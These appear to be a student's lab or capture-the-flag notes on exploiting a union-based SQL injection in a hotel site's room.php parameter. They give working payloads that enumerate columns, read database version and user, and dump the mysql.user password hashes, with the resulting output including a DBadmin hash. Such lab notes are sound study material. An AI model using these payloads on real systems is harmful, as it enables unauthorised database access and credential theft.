possible SQLi in Rooms

http://10.10.10.143/room.php?cod=1
(1-7) anything of of range returns nothing -> definitely a SQLi vulnerabity

Poking around => this seems like a union base SQLi

works with ?cod=1 UNION SELECT 1,2,3,4,5,6,7

Known fields: image,ratings,roomtype,price,description
5 fields, but there are 7 based on the union statement: 2 unknown columns here!

5 is image
2 is ratings
3 is price
4 is description

inject sql command into the fields
?cod=1 UNION SELECT 1,2,@@version,4,database(),user(),7
we get:
@@version returns: 10.1.37-MariaDB-0+deb9u1
database() returns: hotel
user() returns: DBadmin@localhost

php?cod=0 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7 to grab hostname, user and hashed password of the user

localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
